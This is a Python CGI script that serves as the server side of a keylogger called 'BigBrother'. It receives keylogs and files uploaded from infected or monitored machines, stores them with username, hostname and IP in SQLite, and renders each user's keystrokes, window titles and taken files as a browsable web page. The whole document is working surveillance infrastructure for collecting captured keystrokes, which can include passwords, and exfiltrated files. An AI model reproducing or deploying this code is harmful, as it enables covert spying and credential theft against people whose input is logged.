"""
Server side of the BigBrother activity monitor/keylogger. The client logs all activity and
periodically uploads files (either keylogs or other files) via HTTP POST requests. This
CGI script serves two purposes:
	- receiving all files sent by clients and storing them in a database.
			URL: index.py; at least the 'content' and 'filename' POST parameters must be present to
			trigger this upload mode
	- displaying the contents of the database in a human-readable way
			URL: index.py; this is the default behaviour. An optional maxAge parameter can be passed
			to request only logs from the last maxAge seconds
			URL 2: index.py/getFile/<id>/<blah> -- fetch the contents of the file with DB row id <id>.
			Links to URLs of this form are generated by the script itself. <blah> stands for any string.

The parameters of POST requests are described in client's source code (main.cpp), as is the
syntax of keylog files.

This version of the script uses the SQLite database, thus no extra setup is required -- a file
db.dat will be created as needed. 

Mitja, June 2009
"""

import cgi, cgitb, sys
cgitb.enable()


import os, sys, time, re
import sqlite3


def htmlEscape(txt):
	return txt.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;')

_form = cgi.FieldStorage()
def q(key, default=None, forceUnicode=True):
	"""
	Returns the value of the HTTP GET or POST parameter with keyname <key>. Returns <default> if no such
	key exists. If forceUnicode==True, existing values get converted to unicode before being returned.
	"""
	if _form.has_key(key):
		if forceUnicode:
			return unicode(_form.getfirst(key), errors='ignore')
		else:
			return _form.getfirst(key)
	else:
		return default

def setupTablespace():
	"""
	Creates a table uploads with columns as indicated (and described) in the source code.
	Serves more of a documentary purpose and is only needed when setting up a new system.
	"""
	con = sqlite3.connect('db.dat')
	cur = con.cursor()
	cur.execute("CREATE TABLE uploads (id integer PRIMARY KEY AUTOINCREMENT, username text NOT NULL, hostname text NOT NULL, ip text NOT NULL, pid text NOT NULL, localtime bigint NOT NULL, servertime bigint NOT NULL, filename text NOT NULL, content text NOT NULL)")
	# the dict below is for documentation only
	comments = {
		'id': 'Row id.',
		'username': 'Local username of the user uploading the file',
		'hostname': 'Hostname of the machine from which the file was uploaded',
		'ip': 'Local IP of that machine',
		'pid': 'A string <pid>.<rid> where <pid> is process ID of the keylogger and <rid> is a random ID the keylogger chooses at startup.',
		'localtime': 'Local unix timestamp on the uploading machine at the time of upload (the file itself may have been created long before!)',
		'servertime': 'Local unix timestamp on the server at the time of upload',
		'filename': 'Filename of this file, INCLUDING PATH',
		'content': 'Contents of the file, base64-encoded'
	}
	# Postgres specific -- insert the comments into the database
	#for (column, comment) in comments.items():
	#	cur.execute(("COMMENT ON COLUMN uploads.%s IS ?" % column), (comment,))
	con.commit()


def timeStr(timestamp):
	return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))

def isKeylog(row):
	"""
	Returns true iff the given DB table row is a keylog. This is determined by the filename and the
	first bytes of the content (every keylog starts with a timestamp/heartbeat).
	"""
	ok = os.path.split(row['filename'])[1].startswith('__KEYLOG')	
	ok &= row['content'].decode('base64').startswith('\xf0@')
	return ok

def creationTime(row): #currently unused
	"""
	Returns the timestamp describing when the content of the file was created. For keylogs, this is the 
	the value of the first heartbeat timestamp found. For other files, no such info is available, so the
	(local) time of upload is returned.
	"""
	if isKeylog(row):
		content = row['content'].decode('base64')
		ts = re.search('\xf0@T(\\d+)\xf1', content)
		if ts:
			return int(ts.group(1))
	# if we get this far, the keylog did not contain a timestamp (?!) or it is not a keylog row
	return row['localtime']

#classes for storing logical elements of the displayed log
class WindowTitle:
	def __init__(self, title, ts): 
		self.title = title
		self.ts = ts
	def __str__(self): 
		return '<div style="background:#aaf"><small style="color:#666">%s</small><br>%s</div>' % (timeStr(self.ts), htmlEscape(self.title))
class Warning:
	def __init__(self, text, ts): 
		self.text = text
		self.ts = ts
	def __str__(self): 
		return '<div style="background:#faa; border: solid #f33 2px"><small style="color:#666">%s</small> <b>!!! Warning !!!</b><br>%s</div>' % (timeStr(self.ts), self.text)
class Keystrokes:
	def __init__(self, seq, ts): 
		# replace arrows with nice pics
		#seq = seq.replace('<left>','&#x2190 ').replace('<up>','&#x2191 ').replace('<down>','&#x2192 ').replace('<right>','&#x2193 ')
		seq = re.sub('(<left>|<up>|<down>|<right>)+', '&#x2194;', seq)
		# ditto for mouse clicks and wheel scrolls
		seq = seq.replace('<click>','&#x25a0; ').replace('<mwheel>','&#x2302; ')
		# simplify backspaces
		while True:
			seq, nChanges = re.subn('[a-z 0-9]<backspace>', '', seq)
			if nChanges==0: break
		# collapse repeated alt, shift, ctrl presses
		seq = re.sub('(\xf0[asc][+-]\xf1)\\1+', r'\1', seq)
		# collapse the use of shift key on lowercase chars
		seq = re.sub('\xf0s\\+\xf1([a-z]+)\xf0s-\xf1', lambda x: x.group(1).upper(), seq)
		# partial html escape; only "<" signs appear on input anyway, plus we have to preserve amperstands from above
		seq = seq.replace('<','&lt;') 
		# last of all, mark up newlines (we have to avoid html escaping here)
		seq = seq.replace('&lt;enter>','&#x00b6;<br>')
		# display other alt, shift, ctrls nicely
		while True:
			seq, nChanges = re.subn('\xf0([asc])\\+\xf1\xf0(\\1-)\xf1', '', seq) # weed out empty sequences (e.g. shift gets pressed and immediately released)
			if nChanges==0: break
		while True:
			seq, nChanges = re.subn('\xf0([asc])\\+\xf1(.+?)\xf0(\\1-)\xf1', r'<sub>\1</sub>(\2)', seq)
			if nChanges==0: break
		
		self.seq = seq
		self.ts = ts

	def __str__(self):
		return (self.seq.replace('\xf0','!').replace('\xf1','?'))
class FileAttachment:
	def __init__(self, dbRow):
		self.dbRow = dbRow
		self.ts = dbRow['localtime']
	def __str__(self):
		filename = os.path.split(self.dbRow['filename'])[1]
		url = '/BigBrother/index.py/getFile/%d/%s' % (self.dbRow['id'], filename)
		return '<div style="background:#afa"><small style="color:#666">%s</small><br><a href="%s">%s</a></div>' % \
			(timeStr(self.ts), url, htmlEscape(filename))


def userActivityHtml(cur, username, earliestDisplay):
	html = ""
	cur.execute("SELECT * FROM uploads WHERE username=? AND localtime > ? ORDER BY localtime ASC", (username, earliestDisplay))
	rows = cur.fetchall()
	# SQLite dependent -- fix timedate retrieval; convert strings to floats (seconds time since epoch)
	# [not any more -- we ditched the datetime datatype and are using bigints for timestamps. this block can be deleted.]
	#for i in range(len(rows)):
	#	rows[i] = dict(rows[i])
	#	for field in ('localtime', 'servertime'):
	#		rows[i][field] = time.mktime(time.strptime(rows[i][field], '%Y-%m-%d %H:%M:%S'))
	#rows.sort(key=creationTime)

	# get all the keylogs in one big string
	logRows = [r for r in rows if isKeylog(r)]
	log = ''.join(row['content'].decode('base64') for row in logRows)
	
	# find first timestamp in the log, move it to the very beginning
	log = re.sub(r'(.*?)(\xf0@[0-9]+\xf1)(.*)', r'\2\1\3', log)
	
	# Create a list of pairs (timestamp, string with actions in that timestamp).
	# Window titles get a separate pair (so the sole action in that pair is a change of the window title).
	actions = []
	for part in log.split('\xf0@')[1:]:  # skip the first, empty string
		ts, act = part.split('\xf1', 1)
		ts = int(ts)
		if '\xf0T' not in act:	
			actions.append((ts, act))  # no window title change within actions
		else:
			# get a list of "normal" actions interspersed with window titles: [actions, title, actions, title, ..., actions, title, actions]
			parts = re.split('\xf0T(.*?)\xf1', act)  
			for (i, txt) in enumerate(parts):
				if i%2==0: # normal action
					actions.append((ts, txt))
				else:
					actions.append((None, WindowTitle(txt, ts)))
					
	# find any suspicious leaps in timestamps (i.e. absence of heartbeat). If found, insert a warning.
	i = 1
	while i < len(actions):
		now = actions[i][0]
		prev = actions[i-1][0]
		if now!=None and prev!=None and not (0 <= now-prev <= 3):
			actions.insert(i, (None, Warning("Irregular heartbeats: %s followed by %s." % (timeStr(prev), timeStr(now)), now)))
			i += 1
		i += 1
	
	# group consecutive simple keystroke actions into single Keystroke objects.
	actions2 = []
	i = 0
	while i < len(actions):
		if actions[i][0]==None: #special "action", i.e. a warning or window title change
			actions2.append(actions[i][1])
			i += 1
		else:
			start = i
			# find first special action after this one
			while i<len(actions) and actions[i][0]!=None:
				i += 1
			# actions[start:i] now contains keystrokes that should be merged
			seq = ''.join(act for ts,act in actions[start:i])
			if seq != '':
				actions2.append(Keystrokes(seq, actions[start][0]))
	
	# merge file uploads (= everything but the keylogs) into the actions list
	actions2.extend(FileAttachment(row) for row in rows if row not in logRows)
		
	# find any changes in values that should remain constant (username, hostname, ip, pid)
	for i in range(1,len(rows)):
		for var in ('username', 'hostname', 'ip', 'pid'):
			if rows[i][var] != rows[i-1][var]:
				actions2.append(Warning("%s has changed from '%s' to '%s'" % (var, rows[i-1][var], rows[i][var]), rows[i]['localtime']-0.001))
	
	actions2.sort(key = lambda a: a.ts)			
		
	html = '\n'.join(str(a) for a in actions2)
	html = unicode(html, errors='ignore')
	
	if rows==[]:
		rows.append({'hostname':'N/A', 'ip':'N/A'}) # just for display purposes
	columnHeader = '<h3 style="background:black;width:500px;color:white;position:fixed;top:0">%s<br><span style="font-size:70%%">%s (%s)</h3>' % \
		(username, rows[0]['ip'], rows[0]['hostname'])
	columnHeader += '<div style="background:#ccc; padding: .5em">[[ %d records parsed]]</div>' % len(rows)
		
	return '<div style="float:left; font-family:arial; width:500px; border: solid black 1px; margin-top:100px;">%s%s</div>' % (columnHeader, html)


#print ''.join(str(i)+':Hallo Welt! ' for i in range(1,1000))

if q('filename') and q('content'):
	# test with http://localhost/BigBrother/?username=u&hostname=hst&ip=1.2.3.4&localtime=1245801057.28&filename=fn&content=vsebina%20je%20to
	con = sqlite3.connect('db.dat')
	cur = con.cursor()
	cur.execute("INSERT INTO uploads (username, hostname, ip, pid, localtime, servertime, filename, content) VALUES (?,?,?,?,?,?,?,?)",
		(q('username'), q('hostname'), q('ip'), q('pid'), int(q('localtime')), int(time.time()), q('filename'), q('content')))
	con.commit()
	con.close()

	# Save file locally
	#fn = str(time.time()) + '_' + q('filename')
	#for badChar in '|/\\:': fn = fn.replace(badChar,'.')
	#f = open('uploads/'+fn, 'w')
	#f.write(q('content')) # TODO url-decode? maybe automatic.
	#f.close()
	
	print 'content-type:text/html\n'
	print 'OK. Upload succeeded.<br>'
	#for k in _form.keys():
	#	print '"%s"->"%s"<br>' % (k, q(k, '???').replace('\n','\\n'))


elif '/getFile/' in os.environ['PATH_INFO']:
	fileId = re.search(r'/getFile/(\d+)/', os.environ['PATH_INFO']).groups(1)
	con = sqlite3.connect('db.dat')
	cur = con.cursor()
	cur.execute('SELECT filename, content FROM uploads WHERE id=?', fileId)
	fn, content = cur.fetchone()
	content = content.decode('base64')
	sys.stdout.write('content-type: text/plain\n\n')
	sys.stdout.write(content)
	
	con.close()

else:
	print 'content-type:text/html\n\n'
	try:
		setupTablespace(); print '<h1>Tablespace created.</h1>'
	except:
		pass #tablespace already exists
	# display user records. Only those that were created at 'earliestDiplay' or before
	maxAge = q('maxAge', 2*3600)
	earliestDisplay = time.time() - int(maxAge)

	con = sqlite3.connect('db.dat')
	con.row_factory = sqlite3.Row
	cur = con.cursor()
	cur.execute("SELECT distinct(username) as username FROM uploads WHERE localtime > ?", (earliestDisplay,))
	rows = cur.fetchall()
	if not rows:
		print '<h1>No logs available for the last %0.3f minutes</h1>' % (maxAge/60)
	for row in rows:
		print userActivityHtml(cur, row['username'], earliestDisplay)
